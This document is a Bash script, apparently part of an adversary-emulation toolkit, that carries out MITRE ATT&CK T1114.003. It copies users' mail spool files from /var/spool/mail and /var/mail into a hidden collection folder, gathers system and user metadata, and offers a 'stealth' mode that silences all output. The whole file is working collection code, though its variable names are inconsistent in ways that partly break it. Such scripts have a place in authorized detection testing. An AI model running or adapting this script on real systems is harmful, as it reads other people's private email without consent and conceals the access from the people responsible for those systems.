
    # ===== VARIABLES ESSENTIELLES COLLECTION =====
    export T1114_003C_DEBUG_MODE="${T1114_003C_DEBUG_MODE:-false}"
    export T1114_003C_TIMEOUT="${T1114_003C_TIMEOUT:-300}"
    export T1114_003C_FALLBACK_MODE="${T1114_003C_FALLBACK_MODE:-real}"
    export T1114_003C_OUTPUT_FORMAT="${T1114_003C_OUTPUT_FORMAT:-json}"
    export T1114_003C_POLICY_CHECK="${T1114_003C_POLICY_CHECK:-true}"
    export T1114_003C_MAX_FILES="${T1114_003C_MAX_FILES:-200}"
    export T1114_003C_MAX_FILE_SIZE="${T1114_003C_MAX_FILE_SIZE:-1048576}"
    export T1114_003C_SCAN_DEPTH="${T1114_003C_SCAN_DEPTH:-3}"
    export T1114_003C_EXCLUDE_CACHE="${T1114_003C_EXCLUDE_CACHE:-true}"
    export T1114_003C_CAPTURE_DURATION="${T1114_003C_CAPTURE_DURATION:-60}"
    # ===== FIN VARIABLES COLLECTION =====

#!/bin/bash

# T1114.003c - Email Collection: Mutt Spool Linux
# MITRE ATT&CK Enterprise - Collection Tactic (TA0009)
# ATOMIC ACTION: Extract Mutt mail spool files ONLY
# Platform: Linux | Architecture: 4 orchestrators + auxiliary functions

# Critical dependencies verification
Check-CriticalDeps() { 
    for cmd in bash jq bc grep find stat; do 
        command -v "$cmd" >/dev/null || { 
            [[ "${TT1114_003C_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "[ERROR] Missing dependency: $cmd"; exit 1; 
        }
    done
}

# Environment variables loading
Load-EnvironmentVariables() {
    export TT1114_003C_OUTPUT_BASE="${TT1114_003C_OUTPUT_BASE:-./mitre_results}"
    export TT1114_003C_TIMEOUT="${TT1114_003C_TIMEOUT:-300}"
    export TT1114_003C_OUTPUT_MODE="${TT1114_003C_OUTPUT_MODE:-simple}"
    export TT1114_003C_SILENT_MODE="${TT1114_003C_SILENT_MODE:-false}"
    export T1114_003C_MAX_FILES="${T1114_003C_MAX_FILES:-100}"
    
    export T1114_003C_SPOOL_PATHS="${T1114_003C_SPOOL_PATHS:-/var/spool/mail,/var/mail}"
    export T1114_003C_USER_SPOOLS="${T1114_003C_USER_SPOOLS:-auto}"
    export T1114_003C_MAX_FILE_SIZE="${T1114_003C_MAX_FILE_SIZE:-104857600}"
    export T1114_003C_INCLUDE_SYSTEM="${T1114_003C_INCLUDE_SYSTEM:-false}"
}

# System preconditions validation
Validate-SystemPreconditions() {
    [[ -z "$TT1114_003C_OUTPUT_BASE" ]] && { [[ "${TT1114_003C_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "[ERROR] T1114_003C_OUTPUT_BASE not set"; return 1; }
    [[ ! -w "$(dirname "$TT1114_003C_OUTPUT_BASE")" ]] && { [[ "${TT1114_003C_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "[ERROR] Output directory not writable"; return 1; }
    return 0
}

# Output structure initialization
Initialize-OutputStructure() {
    local timestamp=$(date +%Y%m%d_%H%M%S)
    export COLLECTION_DIR="$TT1114_003C_OUTPUT_BASE/T1114_003c_mutt_spool_$timestamp"
    mkdir -p "$COLLECTION_DIR"/{spool_data,metadata} 2>/dev/null || return 1
    chmod 700 "$COLLECTION_DIR" 2>/dev/null
    echo "$COLLECTION_DIR"
}

# Mutt spool file collection
Collect-MuttSpoolFile() {
    local file_path="$1" collection_dir="$2"
    
    [[ ! -f "$file_path" || ! -r "$file_path" ]] && return 1
    
    local file_size=$(stat -c%s "$file_path" 2>/dev/null || echo 0)
    [[ $file_size -gt $T1114_003C_MAX_FILE_SIZE ]] && return 1
    
    local filename=$(basename "$file_path")
    local safe_name="mutt_spool_${filename}_$(date +%s)"
    
    if cp "$file_path" "$collection_dir/spool_data/$safe_name" 2>/dev/null; then
        echo "$file_path:$file_size"
        [[ "$TT1114_003C_SILENT_MODE" != "true" && "${TT1114_003C_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "  + Collected: $file_path ($file_size bytes)" >&2
        return 0
    fi
    return 1
}

# System metadata collection
Collect-SystemMetadata() {
    local collection_dir="$1"
    echo "$(uname -a)" > "$collection_dir/metadata/system_info.txt"
    echo "$(id)" > "$collection_dir/metadata/user_context.txt"
    echo "$(pwd)" > "$collection_dir/metadata/working_dir.txt"
}

# Execution message logging
Log-ExecutionMessage() {
    local message="$1"
    # Silent in stealth mode or when T1114_003C_SILENT_MODE is true
    [[ "$TT1114_003C_SILENT_MODE" != "true" && "${TT1114_003C_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "$message" >&2
}

# Simple output generation
Generate-SimpleOutput() {
    local files_collected="$1" total_size="$2" collection_dir="$3"
    echo "MUTT SPOOL COLLECTION "
    echo "Files: $files_collected"
    echo "Size: $total_size bytes"
    echo "Complete"
}

# Debug output generation
Generate-DebugOutput() {
    local files_collected="$1" total_size="$2" collection_dir="$3"
    local json_output=$(cat << EOF
{
    "@timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
    "technique": "T1114.003c",
    "results": {
        "files_collected": $files_collected,
        "total_size_bytes": $total_size,
        "collection_directory": "$collection_dir"
    }
}
EOF
)
    echo "$json_output" > "$collection_dir/metadata/results.json"
    [[ "$TT1114_003C_SILENT_MODE" != "true" ]] && echo "$json_output"
}

# Stealth output generation
Generate-StealthOutput() {
    local files_collected="$1"
    echo "$files_collected" > /dev/null 2>&1
}

# None output generation
Generate-NoneOutput() {
    : # No output
}
# 4 MAIN ORCHESTRATORS (10-20 lines each)
# Function 1: Configuration (10-20 lines) - Orchestrator
Get-Configuration() {
    Check-CriticalDeps || exit 1
    Load-EnvironmentVariables
    Validate-SystemPreconditions || exit 1
    
    local collection_dir
    collection_dir=$(Initialize-OutputStructure) || exit 1
    
    echo "$collection_dir"
}

# Function 2: Atomic Action (10-20 lines) - Orchestrator
Invoke-MicroTechniqueAction() {
    local collection_dir="$1"
    local collected_files=() total_size=0 file_count=0
    
    Log-ExecutionMessage "[INFO] Extracting Mutt spool files..."
    
    # ATOMIC ACTION: Orchestration of auxiliary functions
    IFS=',' read -ra spool_paths <<< "$T1114_003C_SPOOL_PATHS"
    
    for spool_path in "${spool_paths[@]}"; do
        spool_path=$(echo "$spool_path" | xargs)
        [[ ! -d "$spool_path" ]] && continue
        
        if [[ "$T1114_003C_USER_SPOOLS" == "auto" ]]; then
            while IFS= read -r -d '' spool_file; do
                if result=$(Collect-MuttSpoolFile "$spool_file" "$collection_dir"); then
                    IFS=':' read -r file_path file_size <<< "$result"
                    collected_files+=("$file_path")
                    total_size=$((total_size + file_size))
                    ((file_count++))
                    [[ $file_count -ge ${T1114_003C_MAX_FILES:-100} ]] && break
                fi
            done < <(find "$spool_path" -type f -print0 2>/dev/null)
        else
            IFS=',' read -ra user_list <<< "$T1114_003C_USER_SPOOLS"
            for username in "${user_list[@]}"; do
                username=$(echo "$username" | xargs)
                local spool_file="$spool_path/$username"
                
                if result=$(Collect-MuttSpoolFile "$spool_file" "$collection_dir"); then
                    IFS=':' read -r file_path file_size <<< "$result"
                    collected_files+=("$file_path")
                    total_size=$((total_size + file_size))
                    ((file_count++))
                    [[ $file_count -ge ${T1114_003C_MAX_FILES:-100} ]] && break 2
                fi
            done
        fi
    done
    
    Collect-SystemMetadata "$collection_dir"
    echo "$file_count:$total_size:$(IFS=,; echo "${collected_files[*]}")"
}

# Function 3: Output (10-20 lines) - Orchestrator
Write-StandardizedOutput() {
    local collection_dir="$1" files_collected="$2" total_size="$3"
    
    case "${OUTPUT_MODE:-simple}" in
        "simple")  Generate-SimpleOutput "$files_collected" "$total_size" "$collection_dir" ;;
        "debug")   Generate-DebugOutput "$files_collected" "$total_size" "$collection_dir" ;;
        "stealth") Generate-StealthOutput "$files_collected" ;;
        "none")    Generate-NoneOutput ;;
    esac
}

# Function 4: Main (10-15 lines) - Chief Orchestrator
Main() {
    trap 'echo "[INTERRUPTED] Cleaning up..."; exit 130' INT TERM
    
    # Load environment variables in main context
    Load-EnvironmentVariables

    local collection_dir
    collection_dir=$(Get-Configuration) || exit 2
    
    local results
    results=$(Invoke-MicroTechniqueAction "$collection_dir") || exit 1
    
    IFS=':' read -r files_collected total_size _ <<< "$results"
    Write-StandardizedOutput "$collection_dir" "$files_collected" "$total_size"
    
    Log-ExecutionMessage "[SUCCESS] Completed: $files_collected files collected"
    exit 0
}

# Execute
Main "$@"